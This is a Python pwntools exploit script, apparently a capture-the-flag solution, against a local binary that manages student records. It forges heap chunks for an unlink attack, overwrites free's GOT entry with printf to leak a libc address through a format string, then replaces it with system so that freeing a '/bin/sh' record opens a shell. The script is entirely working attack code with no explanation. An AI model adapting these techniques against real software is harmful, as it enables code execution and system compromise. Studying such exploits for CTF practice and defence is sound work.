#!/usr/bin/python
from pwn import *

p = process('./pwn')

system = 260240
libc_start = 132384
free_got = 0x602018
printf = 0x400860

prev_size = 0
chunk1_size = 0x90
chunk2_size = 0xa0

point_heap = 0x6020e0 + 16*3 + 8 
point_bk =  point_heap - 16
point_fd_low = point_heap - 24
point_fd_high = 0

payload = p32(point_fd_high) + p64(point_bk) + 'a'*0x70 + p64(chunk1_size) + p64(chunk2_size)
Format = '%15$016llx'


raw_input('add 0? ')
#add student 0 		call system
p.recvuntil("information.")
p.sendline('a')
p.recvuntil("information:")
p.sendline('07' + '/bin/sh' + '05aaaaa')


raw_input('add 1? ')
#add student 1		leak
p.recvuntil("information.")
p.sendline('a')
p.recvuntil("information:")
p.sendline(str(len(Format)) + Format + '05aaaaa')


raw_input('add 2? ')
#add student 2
p.recvuntil("information.")
p.sendline('a')
p.recvuntil("information:")
p.sendline('18' + '\0'*6 + p64(chunk1_size | 1) + p32(point_fd_low) + '125' + 'b'*125)


raw_input('add 3? ')
#add student 3
p.recvuntil("information.")
p.sendline('a')
p.recvuntil("information:")
p.sendline('03' + '\0'*3 + '127' + 'd'*127)

raw_input('add 4? ')
#add student 4
p.recvuntil("information.")
p.sendline('a')
p.recvuntil("information:")
p.sendline('10' + 'a'*10 + '100' + 'a'*100)

raw_input('change 3? ')
#change student 3
p.recvuntil("information.")
p.sendline('c')
p.recvuntil("change")
p.sendline('3')
p.sendline(payload)


raw_input('delete 4? ')
#delete 4
p.recvuntil("information.")
p.sendline('d')
p.recvuntil("number")
p.sendline('4')

raw_input('change 3? ')
#change student 3, change pointer
p.recvuntil("information.")
p.sendline('c')
p.recvuntil("change")
p.sendline('3')
p.sendline(p32(30) + p64(free_got-20))


raw_input('change 3? ')
#change student 3, change *pointer
p.recvuntil("information.")
p.sendline('c')
p.recvuntil("change")
p.sendline('3')
p.sendline(p64(printf))


raw_input('delete 1? ')
#delete 1, leak info 
p.recvuntil("information.")
p.sendline('d')
p.recvuntil("number")
p.sendline('1')


data = p.recvline()
data += p.recvline()
libcbase = int(data[1:17], 16) - libc_start - 240
system += libcbase
print 'libcbase: ',hex(libcbase)
print 'system: ',hex(system)


raw_input('change 3? ')
#change student 3, change *pointer
p.recvuntil("information.")
p.sendline('c')
p.recvuntil("change")
p.sendline('3')
p.sendline(p64(system))



raw_input('delete 0? ')
#delete 1, leak info 
p.recvuntil("information.")
p.sendline('d')
p.recvuntil("number")
p.sendline('0')


p.interactive()
